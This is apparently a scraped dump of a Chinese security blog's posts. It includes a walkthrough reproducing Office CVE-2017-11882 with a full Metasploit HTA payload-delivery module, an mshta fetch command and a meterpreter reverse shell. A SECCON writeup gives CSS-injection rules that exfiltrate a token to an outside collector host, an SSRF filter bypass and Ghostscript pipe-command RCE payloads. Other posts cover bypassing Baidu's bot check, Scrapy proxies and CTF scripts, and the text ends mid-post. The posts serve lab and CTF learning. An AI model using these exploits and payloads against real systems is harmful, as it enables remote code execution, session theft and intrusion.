cannot open shared object file: No such file or directory &emsp;&emsp;这段话无非是告诉你缺少libssl.so.1.0.0库，一开始把整个报错信息复制到百度搜索，但没有找到有价值的信息。无奈只能自己想办法解决，而问题的根源就是缺少这个文件，那么我们将从网上下载回这个库文件，所以我将直接在Google上搜索libssl.so.1.0.0，出现的第一条就是我们要的信息。 &emsp;&emsp;选择自己系统对应版本： &emsp;&emsp;按照页面所显示的添加它的更新源： &emsp;&emsp;这里直接放出它的源：1deb http://security.debian.org/debian-security wheezy/updates main &emsp;&emsp;然后执行：12apt updateapt-get install libssl1.0.0 libssl-dev &emsp;&emsp;如上，即可解决问题。","link":"/2018/01/kali-mongodb/"},{"title":"Office CVE-2017-11882复现","text":"这两天，office又出名了，CVE-2017-11882成了圈里关注的热点，今年office爆出好几个漏洞，从CVE-2017-0199、CVE-2017-8570到现在的CVE-2017-11882，exp也是越来越简单粗暴。 下面，我也来蹭波热度。 Step1：万年计算器POCPOC GitHub：可以使用国外出现的第一份poc：https://github.com/embedi/CVE-2017-11882，不过已经停止更新了。这里我使用：https://github.com/Ridter/CVE-2017-11882。使用clone或直接下载zip都行：1git clone https://github.com/Ridter/CVE-2017-11882.git 进入项目文件 12root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o calc.doc[*] Done ! output file --&gt; calc.doc 用靶机打开 至此，以验证该漏洞存在。想在0199的时候还需要自己避免交互，现在poc直接帮你解决。。。 Step2：Get Shell1、还是使用上一步的脚本 12root@Kali:~/hackhub/CVE-2017-11882# python Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.1.231:8080/abc&quot; -o test.doc[*] Done ! output file --&gt; test.doc 先把doc文档放到靶机。 2、上msf首先添加利用脚本，我机子msf exp的路径是/usr/share/metasploit-framework/modules/exploits/windows，可以在这目录下新建一个文件夹。将下面的脚本写入到PS_shell.rb。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = {}) super(update_info(info, &apos;Name&apos; =&gt; &apos;Microsoft Office Payload Delivery&apos;, &apos;Description&apos; =&gt; %q{ This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. }, &apos;License&apos; =&gt; MSF_LICENSE, &apos;Arch&apos; =&gt; ARCH_X86, &apos;Platform&apos; =&gt; &apos;win&apos;, &apos;Targets&apos; =&gt; [ [&apos;Automatic&apos;, {} ], ], &apos;DefaultTarget&apos; =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, &apos;win&apos;, p.encoded, &apos;hta-psh&apos;, { :arch =&gt; ARCH_X86, :platform =&gt; &apos;win &apos;} ) send_response(cli, data, &apos;Content-Type&apos; =&gt; &apos;application/hta&apos;) end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \\&quot;#{url}\\&quot;&quot;) endend 打开msf，执行msfconsole。进去后记得要 reload_all。选择PS_shell脚本，然后开启监听 123456789101112131415161718msf &gt; use exploit/windows/new-exps/PS_shell msf exploit(PS_shell) &gt; msf exploit(PS_shell) &gt; msf exploit(PS_shell) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(PS_shell) &gt; set lhost 192.168.1.231lhost =&gt; 192.168.1.231msf exploit(PS_shell) &gt; set uripath abcuripath =&gt; abcmsf exploit(PS_shell) &gt; exploit [*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.1.231:4444 [*] Using URL: http://0.0.0.0:8080/abc[*] Local IP: http://192.168.1.231:8080/abc[*] Server started.[*] Place the following DDE in an MS document:mshta.exe &quot;http://192.168.1.231:8080/abc&quot; 这里，Msf官方已经出了office_ms17-11882.rb的利用脚本。链接：office_ms17-11882.rb，我还没有试，不过大家可以尝试。 回到靶机，打开test.doc。 此时，我们可以发现，shell已经反弹回来了. 至此，已经 get shell。 免杀版本暂无，但是如果杀毒没有更新，还是能bypass的。。。 参考链接： http://www.cnblogs.com/Hi-blog/p/7878054.html http://payloads.online/archivers/2017-11-22/1","link":"/2017/11/office-cve-2017-11882/"},{"title":"RCTF2018 writeup1","text":"前言&emsp;&emsp;CTFer是不存在周末的，更不存在520…. 杂项git&emsp;&emsp;首先查看了git log但没有线索，思索了一下就直接去查看git文件，最终找到flag.txt。 &emsp;&emsp;接着在logs/HEAD里找到存在flag.txt的编码，再穿越回去即可恢复flag文件。 &emsp;&emsp;flag为：RCTF{gIt_BranCh_aNd_l0g}。 sign&emsp;&emsp;下载后是个exe，但不能运行，用IDA打开后在WinMain函数里可以找到明文的flag，但这个跟IDA的版本有关系，作者的IDA7.0就不行，但队友的OK。 Number Game&emsp;&emsp;比较有意思的一道题，一开始手工各种玩，但根据以往出题人的尿性，越往后时间肯定越短，所以只能考虑自动化脚本提交，然后就去Google了一下猜数字游戏，得到有价值的线索。 &emsp;&emsp;点开看了一下，很真的是一样的玩法，而且下面还有个解题脚本，但由于那个脚本太过复杂，不利于快速修改，只好去gayhub(github)搜索，最终找到一个匹配度极高的solve.py，传送门。 PS: gayhub真是个好东西 &emsp;&emsp;拿到脚本后进行改造，最终的脚本如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149# -*-coding:utf-8 -*-import stringimport hashlibimport socketimport reimport randomdef sha256(s): return hashlib.sha256(s).hexdigest()def fuzz(a, goal): strs = string.letters + string.digits print('[+]爆破中...') rnds = '' for i in strs: for j in strs: for k in strs: for l in strs: rnds = i + j + k + l result = sha256(rnds + a) if result == goal: return rndsall_char=['0','1','2','3','4','5','6','7','8','9']is_visited=[0,0,0,0,0,0,0,0,0,0]all_combine=[]temp=['','','','']def generate(step): if step==4: all_combine.append(''.join(temp)) else: for i in range(0,10): if is_visited[i]:continue temp[step]=all_char[i] is_visited[i]=1 generate(step+1) is_visited[i]=0generate(0)now=all_combine[random.randint(0,len(all_combine)-1)]the_leaf=all_combine[:]def get_type_t(ra,rb): return 10*(ra+1)+rbdef get_type_s(a,b): aa=[a[0],a[1],a[2],a[3]] bb=[b[0],b[1],b[2],b[3]] cc=[0,0,0,0] ra=0 rb=0 s=0 for i in range(0,4): if aa[i]==bb[i]: ra+=1 cc[i]=1 for i in range(0,4): if cc[i]:continue for j in range(0,4): if aa[i]==bb[j]: rb+=1 s=get_type_t(ra,rb) return sn = 1# 传入a,b# 返回nowdef guess_num(a, b): a = int(a) b = int(b) global n, now, the_leaf print(\"第\"+str(n)+\"猜\") if a+b &gt;4: print(\"輸入有錯\") return None elif a==4: print(\"贏惹啦\") return None else: s=get_type_t(a,b) temp=[] for i in range(0,len(the_leaf)): if get_type_s(now,the_leaf[i])==s: temp.append(the_leaf[i]) the_leaf=temp[:] if len(the_leaf)==0: print(\"你一定有輸入錯\") return None elif len(the_leaf)==1: print(\"答案是 \"+the_leaf[0]+\" 不然就是你輸入有錯\") return the_leaf[0] now=the_leaf[random.randint(0,len(the_leaf)-1)] n+=1 return nowsc = socket.socket() # 创建 socket 对象host = \"149.28.139.172\" # 获取本地主机名port = 10002 # 设置端口addr = (host, port)sc.connect(addr) # 绑定端口号tmp = sc.recv(1024)print(tmp + sc.recv(1024))gg = re.findall('\\+(.*)\\)', tmp)[0]sha = re.findall('== (.*)', tmp)[0]go = fuzz(gg, sha)print('[*]爆破完成：'+go)sc.send(go+'\\n')print(sc.recv(2048))print(sc.recv(1024))def one_round(rd): nums = ' '.join(now) print('[+]guess: ' + nums) sc.send(nums + '\\n') rev = sc.recv(1024) print('[+]raw: ' + rev) a = re.findall('\\d', rev)[0] b = re.findall('\\d', rev)[1] print('[+]result: ' + a + ' ' + b) for _ in range(6): hh = guess_num(a,b) if hh == None: print('[*]程序出错！') exit(1) nums = ' '.join(hh) print('[+]guess: ' + nums) sc.send(nums + '\\n') rev = sc.recv(1024) if re.search('You lose', rev): print('[!]预测出错，请重新启动！') exit(1) if re.search('You got it', rev): print('[*]第{}关完成！'.format(rd)) break a = re.findall('\\d', rev)[0] b = re.findall('\\d', rev)[1] print('[+]result: ' + a + ' ' + b) flag = sc.recv(1024) print(flag) if re.search('flag', flag, re.IGNORECASE): print('[*]已找到flag！') exit(0)for rd in range(10): generate(0) now=all_combine[random.randint(0,len(all_combine)-1)] the_leaf=all_combine[:] one_round(rd + 1) &emsp;&emsp;脚本存在一定误差率，如果提示失败，请多试几次。 &emsp;&emsp;flag：RCTF{0lD_GaM3_nAmed_Bu11s_4nd_C0ws}。 REbabyre&emsp;&emsp;这道题是跟队友一起做的，我负责打酱油。。。 &emsp;&emsp;首先题目给出了两个文件，一个可执行文件（babyre），一个输出文件（out）。out文件内容如下：123456789101112131415B80C91FE70573EFEBEED92AE7F7A81937390C17B90347C6CAA7A15DFAA7A15DF526BA076153F1A32545C15AD7D8AA463526BA076FBCB7AA07D8AA4639C513266526BA0766D7DF3E1AA7A15DF9C5132661EDC38649323BC077D8AA463FBCB7AA0153F1A32526BA076F5650025AA7A15DF1EDC3864B13AD888 &emsp;&emsp;一开始没看出这是程序运行过程产生的输出结果，是队友提供的思路。 &emsp;&emsp;用IDA查看了一下，只有一个地方有printf输出。 &emsp;&emsp;认真观察输出结果跟代码后可以发现，程序循环30次，每次输出8位字符，而这个跟题目给出的文件（15行，每行16位）高度吻合，所以猜测这些就是我们要找的flag。 &emsp;&emsp;然后运行一下程序，发现特定的字符不管运行几次结果都一样，所以解题思路就是爆破ASCII码表。我们可以先将可见字符的8位输出结果保存起来，然后进行比对。最后写了个半自动脚本：123456789101112131415161718192021222324252627# -*-coding:utf-8-*-import refle = open('E:/Download/babyre/out', 'r')goal = []for one in fle.readlines(): one = one.strip('\\n') goal.append(one[:8]) goal.append(one[8:])strs = '!\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'strs = list(strs)tmp = []fle2 = open('E:/Download/babyre/shuju.txt', 'r')for one in fle2.readlines(): tmp.append(one.strip('\\n'))flag = ''for one in goal: for ids, tt in enumerate(tmp): ok = re.search(one, tt, re.IGNORECASE) if ok: flag += strs[ids]print(flag) &emsp;&emsp;flag：RCTF{Kee1o9_1s_a1ready_so1ved}。&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;","link":"/2018/05/rctf-writeup1/"},{"title":"一种爬虫绕过百度云加速检测的方法","text":"介绍&emsp;&emsp;最近在做爬虫的时候遇到了百度云加速的浏览器安全检查，经过搜索后得到一种解决方法，现记录。 正文&emsp;&emsp;遇到的检测网页是类似：xxx.com浏览器安全检查中…，如下： &emsp;&emsp;这个网页检测的方法是让浏览器执行一段JS代码，将执行结果作为表单的值，跟其他隐藏值一起提交。这个网页的类似代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;!DOCTYPE HTML&gt;&lt;html lang=\"en-US\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge,chrome=1\" /&gt; &lt;meta name=\"robots\" content=\"noindex, nofollow\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\" /&gt; &lt;title&gt;安全检查中...&lt;/title&gt; &lt;style type=\"text/css\"&gt; html, body {width: 100%; height: 100%; margin: 0; padding: 0;} body {background-color: #ffffff; font-family: Helvetica, Arial, sans-serif; font-size: 100%;} h1 {font-size: 1.5em; color: #404040; text-align: center;} p {font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;} #spinner {margin: 0 auto 30px auto; display: block;} .attribution {margin-top: 20px;} &lt;/style&gt; &lt;script type=\"text/javascript\"&gt; //&lt;![CDATA[ (function(){ var a = function() {try{return !!window.addEventListener} catch(e) {return !1} }, b = function(b, c) {a() ? document.addEventListener(\"DOMContentLoaded\", b, c) : document.attachEvent(\"onreadystatechange\", b)}; b(function(){ var a = document.getElementById('yjs-content');a.style.display = 'block'; setTimeout(function(){ var s,t,o,p,b,r,e,a,k,i,n,g,f, rmFZnZw={\"zIAsbP\":+((+!![]+[])+(+[]))}; t = document.createElement('div'); t.innerHTML=\"&lt;a href='/'&gt;x&lt;/a&gt;\"; t = t.firstChild.href;r = t.match(/https?:\\/\\//)[0]; t = t.substr(r.length); t = t.substr(0,t.length-1); a = document.getElementById('jschl-answer'); f = document.getElementById('challenge-form'); ;rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]));rmFZnZw.zIAsbP*=+((+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP*=+((+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP-=+((!+[]+!![]+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+[])+(+!![]));rmFZnZw.zIAsbP-=+((!+[]+!![]+!![]+!![]+[])+(+[]));rmFZnZw.zIAsbP*=+((!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]));a.value = parseInt(rmFZnZw.zIAsbP, 10) + t.length; '; 121' f.submit(); }, 4000); }, false); })(); //]]&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;table width=\"100%\" height=\"100%\" cellpadding=\"20\"&gt; &lt;tr&gt; &lt;td align=\"center\" valign=\"middle\"&gt; &lt;div class=\"yjs-browser-verification yjs-im-under-attack\"&gt; &lt;noscript&gt;&lt;h1 data-translate=\"turn_on_js\" style=\"color:#bd2426;\"&gt;请打开浏览器的javascript，然后刷新浏览器&lt;/h1&gt;&lt;/noscript&gt; &lt;div id=\"yjs-content\" style=\"display:none\"&gt; &lt;div&gt; &lt;div class=\"bubbles\"&gt;&lt;/div&gt; &lt;div class=\"bubbles\"&gt;&lt;/div&gt; &lt;div class=\"bubbles\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;h1&gt;webbaozi.com &lt;span data-translate=\"checking_browser\"&gt;浏览器安全检查中...&lt;/span&gt;&lt;/h1&gt; &lt;p data-translate=\"process_is_automatic\"&gt;&lt;/p&gt; &lt;p data-translate=\"allow_5_secs\"&gt;还剩 5 秒&amp;hellip;&lt;/p&gt; &lt;/div&gt; &lt;form id=\"challenge-form\" action=\"/cdn-cgi/l/chk_jschl\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"jschl_vc\" value=\"3e6d314d3209433cc8d475dce0d7f73a\"/&gt; &lt;input type=\"hidden\" name=\"pass\" value=\"1512703287.646-mblyHaO5bp\"/&gt; &lt;input type=\"hidden\" id=\"jschl-answer\" name=\"jschl_answer\"/&gt; &lt;/form&gt;&lt;/div&gt; &lt;div class=\"attribution\"&gt;&lt;a href=\"http://su.baidu.com/\" target=\"_blank\" style=\"font-size: 12px;\"&gt;&lt;/a&gt;&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;其中一个解决办法就是用python将这段JS代码执行后得到jschl-answer的值，然后构造get请求提交，从而获得cookies。但是笔者在用requests处理的时候发现，就算将结果运行出来后，使用requests.get()的时候还是会重定向到检测页面，没有办法验证通过。一个可能的原因是requests并不会记录会话，当你提交结果的时候，检测系统会把你当作第一次访问，而不会认为你已经访问过一次，现在是提交结果。这是requests的工作方式。所以只能另想办法。 &emsp;&emsp;我们需要能像浏览器一样能自动解析JS代码的爬虫库，而selenium，这个自动化测试工具就能实现这个目标。所以一个有效的解决方案就是使用selenium，接下来就用代码解释： 12345678from selenium import webdriverbrowser = webdriver.PhantomJS()host = 'http://www.xxxx.com'browser.get(host)sleep(7) #这里注意需要睡眠5s以上，因为检测页面需要5s左右的时间通过，通过后才能获得真正的网页。soup = BeautifulSoup(browser.page_source,'lxml')# 下面就可以做你需要的工作了 关于python运行JavaScript&emsp;&emsp;这里顺带记录如何在python下运行JavaScript。代码：1234567891011import execjsfct = \"\"\"function test(){ var a = 10; var b = 20; return a+b;}\"\"\"ej = execjs.compile(fct)value = ej.call(\"test\") # 调用JS函数并取得返回值print(value)","link":"/2017/12/scrapy-bypass/"},{"title":"SECCON 2018 GhostKingdom writeup","text":"赛后复现 &emsp;&emsp;题目给出的链接如下： &emsp;&emsp;首页： &emsp;&emsp;这里可以看到from internet，说明后面可能会用到SSRF，以达到from localtion的效果。 &emsp;&emsp;注册新用户登录进来可以看到： Upload image&emsp;&emsp;上传图片的功能只能由本地网络登录使用，那么我们第一个目标就是要成为本地网络。 Message to admin&emsp;&emsp;这里可以输入信息，然后发给admin。 &emsp;&emsp;Normal是没有CSS的： &emsp;&emsp;而Emergency有CSS： &emsp;&emsp;它的链接如下： 1http://ghostkingdom.pwn.seccon.jp/?css=c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&amp;msg=aaa&amp;action=msgadm2 &emsp;&emsp;经过测试发现css的值可以被base64解密：123c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9 解密结果为： span{background-color:red;color:yellow} &emsp;&emsp;再对msg进行XSS测试后并没有发现安全隐患。加上css参数可疑，所以这里可以大胆怀疑它考的可能是利用CSS来进行XSS。 Take a screenshot&emsp;&emsp;第三个功能是对指定的地址进行访问并得到网页截图： &emsp;&emsp;可以看出这里就是SSRF的入口。 &emsp;&emsp;当我们利用这个接口访问http://127.0.0.1时发现： 1You can not use URLs that contain the following keywords: 127, ::1, local&emsp;&emsp;后台做了过滤，我们可以使用10进制ip访问，http://2130706433。 &emsp;&emsp;可以看到我们现在的身份是localtion。&emsp;&emsp;通过本地的测试我们可以知道用户登录是使用GET方式的：1http://ghostkingdom.pwn.seccon.jp/?user=200000&amp;pass=123456&amp;action=login&emsp;&emsp;但是Upload images应该是POST请求，我们无法通过SSRF来发送一个POST包，所以我们应该要找到一些凭证，使我们可以在远程登录本地的权限。&emsp;&emsp;在send to admin的页面中，可以发现一个csrf input：1234&lt;span class=\"msg\"&gt;Message: aaa&lt;/span&gt;&lt;input type=\"hidden\" name=\"csrf\" value=\"6a70e8d3466ab7339dd17d\"&gt;&lt;input type=\"hidden\" name=\"action\" value=\"msgadm3\"&gt;&lt;input type=\"submit\" class=\"btn\" value=\"Send to admin\"&gt;&emsp;&emsp;它的值跟我们的cookie是一样的： &emsp;&emsp;所以我们可以尝试拿出这个cookie，然后在我们浏览器上伪造身份。而且这个cookie出现的地方就在存在XSS的地方。可以推测考点就在这。&emsp;&emsp;我们可以构造一下CSS的XSS payload：12345678910111213141516input[value^=\"0\"] {background: url(http://server?csrf=0)}input[value^=\"1\"] {background: url(http://server?csrf=1)}input[value^=\"2\"] {background: url(http://server?csrf=2)}input[value^=\"3\"] {background: url(http://server?csrf=3)}input[value^=\"4\"] {background: url(http://server?csrf=4)}input[value^=\"5\"] {background: url(http://server?csrf=5)}input[value^=\"6\"] {background: url(http://server?csrf=6)}input[value^=\"7\"] {background: url(http://server?csrf=7)}input[value^=\"8\"] {background: url(http://server?csrf=8)}input[value^=\"9\"] {background: url(http://server?csrf=9)}input[value^=\"a\"] {background: url(http://server?csrf=a)}input[value^=\"b\"] {background: url(http://server?csrf=b)}input[value^=\"c\"] {background: url(http://server?csrf=c)}input[value^=\"d\"] {background: url(http://server?csrf=d)}input[value^=\"e\"] {background: url(http://server?csrf=e)}input[value^=\"f\"] {background: url(http://server?csrf=f)}&emsp;&emsp;为了简单，我这里写了一个脚本：123456789101112131415161718192021222324252627282930313233# -*-coding:utf-8 -*-import requestsimport base64from urllib.parse import quotefrom time import sleepreal = 'http://ghostkingdom.pwn.seccon.jp/?user=200000&amp;pass=123456&amp;action=login'login = 'http://2130706433/?user=200000&amp;pass=123456&amp;action=login'# http://ghostkingdom.pwn.seccon.jp/?action=msgadmpayload = 'input[value^=\"%s\"] {background: url(http://j1jdaj.ceye.io?csrf=%s)}'url = 'http://2130706433/?css={}&amp;msg=aaa&amp;action=msgadm2'vul = 'http://ghostkingdom.pwn.seccon.jp/?url={}&amp;action=sshot2's = requests.Session()req = s.get(real)sleep(2)s.get(vul.format(login))sleep(2)tmp = ''for value in '0123456789abcdef': temp = payload % (value, value) tmp += temp + '\\n'print(tmp)tmp = base64.b64encode(tmp.encode()).decode()tmp = tmp.replace('=', '')tmp = url.format(tmp)print(tmp)t = quote(tmp, 'utf-8')# print(t)req = s.get(vul.format(t))&emsp;&emsp;运行后就能得到cookie中的一个值，然后逐一爆破。 &emsp;&emsp;这里需要根据服务器返回的值手动更新[value^=&quot;%s&quot;]。最后会得到如：1[value^=&quot;48393e942c8ec6e114ab99%s&quot;]&emsp;&emsp;将cookie置换后就能开启上传功能： &emsp;&emsp;我上传一个错误的jpg。 &emsp;&emsp;点击转换成GIF，可以得到一堆报错信息：1convert: Not a JPEG file: starts with 0x61 0x61 `/var/www/html/images/b3478fc02b23bdd897320b688a086b40.jpg&apos; @ error/jpeg.c/JPEGErrorHandler/316. convert: no images defined &emsp;&emsp;拿去Google，可以找到这是ImageMagick的框架，而ImageMagick又爆出过很多漏洞，所以我们可以找找可利用的exp。 &emsp;&emsp;这里真正的漏洞在GhostScript，被ImageMagick用来转换、裁剪图片。我们可以在exploit-database中找到利用脚本。链接：https://www.exploit-db.com/exploits/45243/。 &emsp;&emsp;POC如下：12345678910111213141516171819This one works for me on the version in Ubuntu:$ cat shellexec.jpeg%!PSuserdict /setpagedevice undefsavelegal{ null restore } stopped { pop } if{ legal } stopped { pop } ifrestoremark /OutputFile (%pipe%id) currentdevice putdevicepropsFor CentOS, try this:$ cat shellexec.jpeg%!PSuserdict /setpagedevice undeflegal{ null restore } stopped { pop } iflegalmark /OutputFile (%pipe%id) currentdevice putdeviceprops &emsp;&emsp;这里我们要使用centos的版本，上传poc后： &emsp;&emsp;get flag：123456%!PSuserdict /setpagedevice undeflegal{ null restore } stopped { pop } iflegalmark /OutputFile (%pipe%cat ./FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops &emsp;&emsp; &emsp;&emsp;SECCON{CSSinjection+GhostScript/ImageMagickRCE} &emsp;&emsp;flag也说明了这道题的考点。","link":"/2018/11/seccon2018-web-writeup/"},{"title":"“黑塔”-一款专注于网络安全的垂直搜索引擎","text":"关于&emsp;&emsp;这个项目，项目地址，暂且称为“黑塔”，愿景是能够成为网络安全中的一座灯塔，为寻路的人提供方向。它是一款专注于网络安全的垂直搜索引擎。 &emsp;&emsp;一开始想到这个项目的初衷是锻炼自己的开发能力，以及方便自己需要的时候查找资料。但在后来，作者发现网上还没有一款专注于网络安全的垂直搜索引擎，遂萌发自己打造一款引擎。也许有人会觉得百度、Google等主流搜索引擎那么强大，哪还需要自己专门开发一款垂直搜索引擎，但事实上并非如此，这里不是说它们不够强大，而是从另一个角度思考问题，Google等搜索引擎包罗万象，体积庞大，很多时候无法收录全面，并且更新存在比较大的延迟，这对信息新鲜度要求极高的网安领域来说是一个缺陷，加之很多大佬的优质博客根本没有做所谓的SEO优化，导致即使被搜索引擎收录，其排名也比较低下，用户需要特别注意才能发觉。 &emsp;&emsp;而作为垂直搜索引擎，它拥有短小精悍、更新速度快、信息来源准确的特点，它能够给用户提供新鲜、准确、原创的信息，这就是垂直搜索引擎存在的意义。 &emsp;&emsp;“黑塔”的收录信息主要来源于网络安全领域各大佬的博客、安全论坛等专业、可信的信息源，所以，在这里，你能得到更加准确、新鲜的信息，要知道，在网安领域，一个漏洞或EXP晚一小时到你手里所产生的影响都是不同的。“黑塔”的另一个特点就是对新手朋友帮助较大，刚入门或还在入门阶段的人可以把“黑塔”作为增加知识储备的手段，这里有着各网安大佬的原创文章、实战记录，潜心阅读并加以复现对提高自己的技术水平是很有帮助的。 &emsp;&emsp;目前，“黑塔”的开发工作仍在继续，不管它是否能受到用户欢迎，也不管它的用户量能有多大，作者都将继续完善、丰富它，以此作为作者增加开发经验、学习网安技术的手段。如果你有好的建议、想法或者本站的漏洞，也欢迎联系我，我相信你能找到我的联系方式。 &emsp;&emsp;最后，希望大家能在光怪陆离、包罗万象的“黑客世界”中找到属于自己的路，也希望“黑塔”能在你成长的过程中给予你帮助，在这个充满黑、白、灰的世界中，坚持初心，不越雷池，才能方得始终。","link":"/2017/12/security-search/"},{"title":"解决Scrapy爬虫卡(停)顿问题","text":"介绍&emsp;&emsp;最近在做爬虫的时候经常遇到爬虫卡顿（停顿）的情况，让人很是苦恼，稍不注意就进程就卡住，在搜索了方法后，最后采用自动代理切换+超时下载件的方法解决。 编写自动代理中间件&emsp;&emsp;在项目的middlewares.py中新建一个自动代理中间件的类，如下：1234567891011121314151617181920212223242526272829class MyproxyMiddleware(object): \"\"\"docstring for ProxyMiddleWare\"\"\" def process_request(self, request, spider): '''对request对象加上proxy''' # proxy = self.get_random_proxy() haha = random.randint(0,10) if haha &gt;= 5: print('\\n随机{}正在使用代理\\n'.format(haha)) proxy = 'http://127.0.0.1:8087' request.meta['proxy'] = proxy def process_response(self, request, response, spider): '''对返回的response处理''' # 如果返回的response状态不是200，重新生成当前request对象 if response.status != 200: proxy = 'http://127.0.0.1:8087' # print(\"this is response ip:\" + proxy) # 对当前reque加上代理 request.meta['proxy'] = proxy return request return response def process_exception(self, request, exception, spider): # 出现异常时（超时）使用代理 print(\"\\n出现异常，正在使用代理重试....\\n\") proxy = 'http://127.0.0.1:8087' request.meta['proxy'] = proxy return request &emsp;&emsp;process_request()方法是发起请求时调用的，所以如果你希望一开始请求就使用代理就可在这里写上代理地址，这个函数可以返回三个值：None、request、response。如果是返回None，说明不对请求头做任何处理；如果返回request，则按照用户定制的请求头请求网页，如果我们要使用代理则需返回request，不写明写返回也是返回request；response表示不再使用其他下载中间件，直接返回响应结果。 &emsp;&emsp;这里我使用随机的方法使用代理，毕竟代理流量也是有限度的。我使用的是XX-NET免费代理，它的主要用途是被国人拿来扶墙的，它提供自动IP切换服务，可以很好的为爬虫服务。另一种免费躲避IP限制的方法是使用tor，不过在国内的话需要先科学上网。 &emsp;&emsp;process_exception()是对爬虫请求是出现的异常情况进行处理的方法，它会捕捉超时、503等异常，当我们出现卡顿或停顿时很有可能就是超时，所以我们要编写这个函数。当返回request时，爬虫会重新使用使用代理进行请求，我们需要的就是这个功能。 添加下载中间件&emsp;&emsp;将上面的中间件添加到setting.py中，12345DOWNLOADER_MIDDLEWARES = { 'scrapy_first.middlewares.MyproxyMiddleware':200, 'scrapy_first.middlewares.RandomUserAgent':158, 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware':500,} &emsp;&emsp;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware这个中间件可以定义超时时间，配合DOWNLOAD_TIMEOUT = 200使用。这也是防止爬虫停顿的方法。另一个跟这个功能差不多的是：scrapy.contrib.downloadermiddleware.retry.RetryMiddleware，有需要的也可以添加进去，它会把超时或者 HTTP 500 错误导致失败的页面记录下来，当爬虫爬取完正常的页面后再统一重新请求这些异常也页面。它有三个属性： RETRY_ENABLED RETRY_TIMES RETRY_HTTP_CODES &emsp;&emsp;各自的属性：12345678910111213141516171819RETRY_ENABLED新版功能。默认： TrueRetry Middleware 是否启用。RETRY_TIMES默认：2包括第一次下载，最多的重试次数RETRY_HTTP_CODES默认： [500, 502, 503, 504, 400, 408]重试的 response 返回值(code)。其他错误(DNS 查找问题、连接失败及其他)则一定会进行重试。 &emsp;&emsp;通过合理配置这些下载中间件就能很好的避免爬虫卡死的情况。","link":"/2017/12/scrapy-proxy/"},{"title":"Selenium下自动识别验证码登陆","text":"介绍&emsp;在自动化或者爬虫登陆网站时经常遇到验证码模块，这也算是反爬的一种手段。这篇文章将介绍如何在selenium框架下自动识别验证码登陆。 一：安装Tesseract-ocr&emsp;Tesseract-ocr是文字识别系统，能识别英文、数字，如果需要识别汉字，则需要导入汉字语言包。 在Windows下安装&emsp;&emsp;下载地址：Tesseract-ocr，这里可以选择版本，本机中选择4.0.0版。下载后默认安装，这里可以选择修改原安装路径，但修改后在后续进行环境变量的配置时记得更改。&emsp;&emsp;安装完毕后，配置系统环境变量。在Path一项中新增Tesseract-ocr的安装路径。 &emsp;&emsp;接着在系统变量中新建如下系统变量，告诉Tesseract-ocr数据集的位置。 &emsp;&emsp;然后验证是否安装成功。 在Linux下安装&emsp;&emsp;直接执行：apt install tesseract-ocr。 二：python脚本123456789101112131415161718192021222324252627282930from selenium import webdriverfrom PIL import Imagebrowser = webdriver.Chrome()host = 